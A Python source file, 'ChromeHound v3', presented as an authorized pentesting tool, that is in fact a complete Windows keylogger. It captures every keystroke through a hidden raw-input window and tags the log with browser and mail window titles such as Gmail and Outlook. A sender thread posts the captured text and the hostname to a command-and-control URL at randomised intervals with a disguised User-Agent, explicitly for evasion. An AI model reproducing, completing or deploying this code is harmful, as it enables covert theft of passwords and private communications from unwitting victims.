"""
ChromeHound v3 — Fixed Raw Input + Full Evasion
Authorized pentesting tool. No comments in production build.
"""
import ctypes, ctypes.wintypes, json, os, sys, time, threading, random, struct, base64, subprocess

class WinAPI:
    _cache = {}
    
    @classmethod
    def _mod(cls, name):
        if name not in cls._cache:
            h = ctypes.windll.kernel32.GetModuleHandleW(name)
            if not h:
                h = ctypes.windll.kernel32.LoadLibraryW(name)
            cls._cache[name] = h
        return cls._cache[name]
    
    @classmethod
    def fn(cls, mod, name, restype=ctypes.c_int, *argtypes):
        h = cls._mod(mod)
        if not h:
            return None
        addr = ctypes.windll.kernel32.GetProcAddress(h, name)
        if not addr:
            return None
        f = ctypes.CFUNCTYPE(restype, *argtypes)(addr) if argtypes else ctypes.CFUNCTYPE(restype)(addr)
        return f

class WNDCLASSW(ctypes.Structure):
    _fields_ = [
        ("style",        ctypes.c_uint32),
        ("lpfnWndProc",  ctypes.c_void_p),
        ("cbClsExtra",   ctypes.c_int),
        ("cbWndExtra",   ctypes.c_int),
        ("hInstance",    ctypes.c_void_p),
        ("hIcon",        ctypes.c_void_p),
        ("hCursor",      ctypes.c_void_p),
        ("hbrBackground",ctypes.c_void_p),
        ("lpszMenuName", ctypes.c_wchar_p),
        ("lpszClassName",ctypes.c_wchar_p),
    ]

class RawKeylogger:
    def __init__(self):
        self._buf = []
        self._lock = threading.Lock()
        self._running = True
        self._last_domain = ""
        self._hwnd = None

        self._RegisterRawInputDevices = WinAPI.fn("user32.dll","RegisterRawInputDevices",ctypes.c_bool,ctypes.c_void_p,ctypes.c_uint32,ctypes.c_uint32)
        self._GetRawInputData = WinAPI.fn("user32.dll","GetRawInputData",ctypes.c_uint32,ctypes.c_void_p,ctypes.c_uint32,ctypes.POINTER(ctypes.c_uint32),ctypes.c_uint32)
        self._DefWindowProcW = WinAPI.fn("user32.dll","DefWindowProcW",ctypes.c_void_p,ctypes.c_void_p,ctypes.c_uint32,ctypes.c_uint32,ctypes.c_uint32)
        self._CreateWindowExW = WinAPI.fn("user32.dll","CreateWindowExW",ctypes.c_void_p,ctypes.c_uint32,ctypes.c_wchar_p,ctypes.c_wchar_p,ctypes.c_uint32,ctypes.c_int,ctypes.c_int,ctypes.c_int,ctypes.c_int,ctypes.c_void_p,ctypes.c_void_p,ctypes.c_void_p,ctypes.c_void_p)
        self._GetMessageW = WinAPI.fn("user32.dll","GetMessageW",ctypes.c_int,ctypes.c_void_p,ctypes.c_void_p,ctypes.c_uint32,ctypes.c_uint32)
        self._TranslateMessage = WinAPI.fn("user32.dll","TranslateMessage",ctypes.c_int,ctypes.c_void_p)
        self._DispatchMessageW = WinAPI.fn("user32.dll","DispatchMessageW",ctypes.c_void_p,ctypes.c_void_p)
        self._GetForegroundWindow = WinAPI.fn("user32.dll","GetForegroundWindow",ctypes.c_void_p)
        self._GetWindowTextW = WinAPI.fn("user32.dll","GetWindowTextW",ctypes.c_int,ctypes.c_void_p,ctypes.c_int,ctypes.c_int)
        self._GetKeyState = WinAPI.fn("user32.dll","GetKeyState",ctypes.c_short,ctypes.c_int)
        self._DestroyWindow = WinAPI.fn("user32.dll","DestroyWindow",ctypes.c_int,ctypes.c_void_p)

    def _window_proc(self, hwnd, msg, wparam, lparam):
        if msg == 0x00FF:
            size = ctypes.c_uint32(0)
            self._GetRawInputData(lparam, 0x10000003, None, ctypes.byref(size), 8)
            if size.value:
                buf = ctypes.create_string_buffer(size.value)
                if self._GetRawInputData(lparam, 0x10000003, buf, ctypes.byref(size), 8) == size.value:
                    raw_size = struct.unpack_from('<I', buf, 4)[0]
                    if raw_size >= 24:
                        vk = struct.unpack_from('<H', buf, 24)[0]
                        flags = struct.unpack_from('<H', buf, 22)[0]
                        make_flag = (flags & 1) == 0
                        if vk and make_flag and vk != 0xFF:
                            self._log_key(vk)
        return self._DefWindowProcW(hwnd, msg, wparam, lparam)

    def _log_key(self, vk):
        if vk == 0x08: self._write("[BS]")
        elif vk == 0x09: self._write("[TAB]")
        elif vk == 0x0D: self._write("\n")
        elif vk == 0x1B: self._write("[ESC]")
        elif vk == 0x20: self._write(" ")
        elif vk == 0x2E: self._write("[DEL]")
        elif vk == 0x2D: self._write("[INS]")
        elif vk == 0x70: self._write("[F1]")
        elif vk == 0x71: self._write("[F2]")
        elif vk == 0x72: self._write("[F3]")
        elif vk == 0x73: self._write("[F4]")
        elif vk == 0x74: self._write("[F5]")
        elif vk == 0x75: self._write("[F6]")
        elif vk == 0x76: self._write("[F7]")
        elif vk == 0x77: self._write("[F8]")
        elif vk == 0x78: self._write("[F9]")
        elif vk == 0x79: self._write("[F10]")
        elif vk == 0x7A: self._write("[F11]")
        elif vk == 0x7B: self._write("[F12]")
        elif 0x41 <= vk <= 0x5A:
            shift = self._GetKeyState(0x10) & 0x8000 if self._GetKeyState else 0
            caps = self._GetKeyState(0x14) & 0x0001 if self._GetKeyState else 0
            uppercase = bool(shift) ^ bool(caps)
            self._write(chr(vk) if uppercase else chr(vk).lower())
        elif 0x30 <= vk <= 0x39:
            shift = self._GetKeyState(0x10) & 0x8000 if self._GetKeyState else 0
            special = ")!@#$%^&*("
            self._write(special[vk - 0x30] if shift else str(vk - 0x30))
        elif vk == 0xBE: self._write(">" if self._GetKeyState(0x10)&0x8000 else ".")
        elif vk == 0xBC: self._write("<" if self._GetKeyState(0x10)&0x8000 else ",")
        elif vk == 0xBF: self._write("?" if self._GetKeyState(0x10)&0x8000 else "/")
        elif vk == 0xBA: self._write(":" if self._GetKeyState(0x10)&0x8000 else ";")
        elif vk == 0xDE: self._write('"' if self._GetKeyState(0x10)&0x8000 else "'")
        elif vk == 0xDB: self._write("{" if self._GetKeyState(0x10)&0x8000 else "[")
        elif vk == 0xDD: self._write("}" if self._GetKeyState(0x10)&0x8000 else "]")
        elif vk == 0xDC: self._write("|" if self._GetKeyState(0x10)&0x8000 else "\\")
        elif vk == 0xC0: self._write("~" if self._GetKeyState(0x10)&0x8000 else "`")
        elif vk == 0xBD: self._write("_" if self._GetKeyState(0x10)&0x8000 else "-")
        elif vk == 0xBB: self._write("+" if self._GetKeyState(0x10)&0x8000 else "=")
        elif vk == 0x25: self._write("[←]")
        elif vk == 0x27: self._write("[→]")
        elif vk == 0x26: self._write("[↑]")
        elif vk == 0x28: self._write("[↓]")
        elif vk == 0x24: self._write("[HOME]")
        elif vk == 0x23: self._write("[END]")
        elif vk == 0x21: self._write("[PGUP]")
        elif vk == 0x22: self._write("[PGDN]")

    def _write(self, text):
        with self._lock:
            self._buf.append(text)

    def _title_watcher(self):
        while self._running:
            time.sleep(random.uniform(3.0, 5.0))
            try:
                hwnd = self._GetForegroundWindow()
                if hwnd:
                    buf = ctypes.create_unicode_buffer(256)
                    self._GetWindowTextW(hwnd, buf, 256)
                    title = buf.value
                    if title:
                        browsers = ["chrome","edge","firefox","brave","opera","gmail","outlook","mail"]
                        domain = ""
                        for b in browsers:
                            if b in title.lower():
                                parts = title.split(" - ")
                                domain = parts[0].strip()[:30] if parts else title[:30]
                                break
                        if domain and domain != self._last_domain:
                            self._last_domain = domain
                            self._write(f"\n── [{domain}] ──\n")
            except:
                pass

    def _sender(self, c2_url):
        while self._running:
            time.sleep(random.uniform(6.0, 10.0))
            with self._lock:
                if not self._buf:
                    continue
                content = "".join(self._buf)
                self._buf.clear()
            if content.strip():
                try:
                    import urllib.request
                    hostname = os.environ.get("COMPUTERNAME", "host")
                    data = json.dumps({"k": content[:2000],"h": hostname[:6],"t": int(time.time())}).encode()
                    req = urllib.request.Request(c2_url,data=data,headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
                    urllib.request.urlopen(req, timeout=5)
                except:
                    pass

    def start(self, c2_url):
        """Fixed: uses proper WNDCLASSW structure for RegisterClassW."""
        WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32,
                                     ctypes.c_uint32, ctypes.c_uint32)
        wndproc = WNDPROC(self._window_proc)

        # --- FIX: Use proper WNDCLASSW structure ---
        wc = WNDCLASSW()
        wc.style = 0
        wc.lpfnWndProc = ctypes.cast(wndproc, ctypes.c_void_p)
        wc.cbClsExtra = 0
        wc.cbWndExtra = 0
        hinst = WinAPI.fn("kernel32.dll","GetModuleHandleW",ctypes.c_void_p,ctypes.c_wchar_p)
        wc.hInstance = hinst(None) if hinst else 0
        wc.hIcon = 0
        wc.hCursor = 0
        wc.hbrBackground = 0
        wc.lpszMenuName = None
        wc.lpszClassName = "RawInputLoggerClass"

        atom = ctypes.windll.user32.RegisterClassW(ctypes.byref(wc))
        if not atom:
            return False

        hwnd = self._CreateWindowExW(0, "RawInputLoggerClass", "", 0,
                                     0, 0, 0, 0, None, None, None, None)
        if hwnd:
            self._hwnd = hwnd

        rid_dev = (ctypes.c_uint32 * 4)(0x01, 0x06, 0x00000100, hwnd if hwnd else 0)
        self._RegisterRawInputDevices(rid_dev, 1, ctypes.sizeof(ctypes.c_uint32) * 4)

        threading.Thread(target=self._title_watcher, daemon=True).start()
        threading.Thread(target=self._sender, args=(c2_url,), daemon=True).start()

        msg = (ctypes.c_uint32 * 6)()
        while self._running:
            ret = self._GetMessageW(msg, None, 0, 0)
            if ret <= 0:
                break
            self._TranslateMessage(msg)
            self._DispatchMessageW(msg)
        return True

    def stop(self):
        self._running = False
        if self._hwnd:
            try:
                self._DestroyWindow(self._hwnd)
            except:
                pass
